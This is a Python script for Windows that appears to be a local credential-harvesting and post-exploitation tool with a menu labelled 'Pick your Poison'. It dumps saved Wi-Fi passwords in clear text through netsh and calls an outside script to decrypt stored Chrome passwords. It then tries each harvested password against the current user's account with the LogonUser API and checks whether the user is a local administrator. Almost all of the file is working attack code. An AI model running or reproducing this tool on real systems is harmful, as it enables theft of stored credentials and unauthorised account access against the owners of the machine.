import os
import subprocess
import os
try:
    from colorama import *
except:
    os.system("pip install colorama")
import win32security
import win32api
import win32con
import win32console
import win32process
import win32net

print("be sure to run the below command for colors to work!")
print("REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1")

def osversion():
    WIN11_22H2=22621
    WIN11_21H2=22000
    WIN10_22H2=19045
    WIN10_21H2=19043
    WIN10_21H2_2=19044
    WIN10_20H2=19042
    WIN10_2004=19041
    WIN10_1909=18363
    WIN10_1903=18362
    WIN10_1809=17763
    WIN10_1803=17134
    WIN10_1709=16299
    WIN10_1703=15063
    WIN10_1607=14393
    WIN10_1511=10586
    ver=subprocess.getoutput("ver")
    
    if str(WIN11_22H2) in str(ver):
        print(Back.GREEN + "Windows 11 22H2"+ Style.RESET_ALL)    
    if str(WIN11_21H2) in str(ver):
        print(Back.GREEN + "Windows 11 21H2"+ Style.RESET_ALL)  
    if str(WIN10_22H2) in str(ver):
        print(Back.GREEN + "Windows 10 22H2"+ Style.RESET_ALL)
    if str(WIN10_21H2) in str(ver):
        print(Back.GREEN + "Windows 10 21H2" + Style.RESET_ALL)         
    if str(WIN10_21H2_2) in str(ver):
        print(Back.GREEN + "Windows 10 21H2" + Style.RESET_ALL)
    if str(WIN10_20H2) in str(ver):
        print(Back.GREEN + "Windows 10 20H2" + Style.RESET_ALL)       
    if str(WIN10_2004) in str(ver):
        print(Back.GREEN + "Windows 10 2004" + Style.RESET_ALL)
    if str(WIN10_1909) in str(ver):
        print(Back.GREEN + "Windows 10 1909" + Style.RESET_ALL)
    if str(WIN10_1903) in str(ver):
        print(Back.GREEN + "Windows 10 1903" + Style.RESET_ALL)
    if str(WIN10_1809) in str(ver):
        print(Back.GREEN + "Windows 10 1809" + Style.RESET_ALL)
    if str(WIN10_1803) in str(ver):
        print(Back.GREEN + "Windows 10 1803" + Style.RESET_ALL)
    if str(WIN10_1709) in str(ver):
        print(Back.GREEN + "Windows 10 1709" + Style.RESET_ALL)
    if str(WIN10_1703) in str(ver):
        print(Back.GREEN + "Windows 10 1703" + Style.RESET_ALL)
    if str(WIN10_1607) in str(ver):
        print(Back.GREEN + "Windows 10 1607" + Style.RESET_ALL)
    if str(WIN10_1511) in str(ver):
        print(Back.GREEN + "Windows 10 1511" + Style.RESET_ALL) 

    #if int(ver) < 10500:
    #    print(Back.RED + "This is an older unsupported OS, and likely vulnerable to multiple kernel based exploits" + Style.RESET_ALL)    
    print("\n")
    main()


def crackem(thebooty):
    cracked=[]
    #print(thebooty)
    print("Attempting to login using Windows API calls!\n")
    for booty in thebooty:
        try:
            if (win32security.LogonUser(os.getlogin(), None, booty, win32con.LOGON32_LOGON_INTERACTIVE, win32con.LOGON32_PROVIDER_DEFAULT)):
                print(Back.GREEN + "Authentication Success!!!" +Style.RESET_ALL + " username: " + os.getlogin() + " password: " + booty)
                cracked.append(booty)
        except:
            print(Fore.RED + "wrong password..." + Style.RESET_ALL)
    if cracked:
        print("\n\n=============================================\n")
        print(Back.MAGENTA + "Logged in successfully as: " + Style.RESET_ALL + Fore.GREEN + os.getlogin() + Style.RESET_ALL + Back.MAGENTA + " using password(s): " + Style.RESET_ALL + Fore.GREEN, cracked)
        print(Style.RESET_ALL)
        groupmembership()
        
def groupmembership():
    computername=os.environ['logonserver'][2:]
    groups = win32net.NetUserGetLocalGroups(computername, os.getlogin())
    print("user is a part of these groups:")
    for group in groups:
        print(group)
        if "Administrators" in group:
            print(Back.GREEN + os.getlogin() + " is a member of the local admins group!!!" + Style.RESET_ALL)
    
        else:
            print(os.getlogin() + " is a member of the users group")
    print("\n")
    main()  
            
def findpasswords():
    cmd="for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j"
    print("Searching for passwords in WIFI list")
    print("====================================")
    s = subprocess.getoutput(cmd)
    s=s.split()
    print("SSIDs Discovered: ", s)


    alltheloot=[]
    count=0
    for items in s:
        x=subprocess.getoutput("netsh wlan show profiles "+ items +" key=clear | find \"Name\"")
        t=subprocess.getoutput("netsh wlan show profiles "+ items +" key=clear | find \"Content\"")
        ssid=x.replace("Name","Wifi SSID")
        the_password=t.replace("Key Content","Password discovered!")
        finalloot=the_password[38:]
        mainssid=ssid[34:]
        if "Content" in t:
            count=count+1
            print("SSID: " + mainssid)
            print(Back.GREEN + "Password: " + finalloot + Style.RESET_ALL)
            alltheloot.append(finalloot)
            print(Style.RESET_ALL)

    try:
        chrome=subprocess.getoutput("py decryptbrowser.py | find \"Password:\"")
    except:
        print("hmmm, either the browser is currently active/running as a process, or this user doesn't have any stored passwords.  Lastly, this could have failed because packages need to be installed by pip.  The error message should show what was not installed (tries to install it for you btw) via the try/except message from decrypt_browser.py")
    chrome=chrome.split("Password")
    chrome.pop(0)

    print("Chrome Passwords")
    print("================")

    for passes in chrome:
        count=count+1
        print(Back.LIGHTBLUE_EX + "password discovered!!!" + Style.RESET_ALL) 
        print(passes[2:].strip() + Style.RESET_ALL) 
        alltheloot.append(passes[2:].strip("\n"))

   
    print("\n=================================================\nOkay...time to do a unique sort on these passwords!")
    avastye = []
    unique_loot = set(alltheloot)
    for uloot in unique_loot:
        avastye.append(uloot)

    print("\n=================================\n"+Back.GREEN+"total Unique passwords discovered: " + str(len(avastye)) + "!!!" + Style.RESET_ALL)
    print("\n" + "Would you like to try logging in to this machine using them?")
    print("Y or N?")
    theinput=input(":")
    if theinput == "Y" or theinput == "y":
        crackem(avastye)
    else:
        print("cool. later!\n")
        main()

def main():
    print("=======================\nPick your Poison (q=quit)\n=======================")
    print("1. Try and find passwords to crack")
    print("2. Grab OS Version")
    print("3. Group Membership Info")
    choice=input(":")
    if choice == "1":
        findpasswords()
    if choice == "2":
        osversion()
    if choice == "3":
        groupmembership()
    if choice == "q":
        quit(0)
    else:
        print("I don't know about that choice, so umm....ok bye!!")
        exit(0)
main()   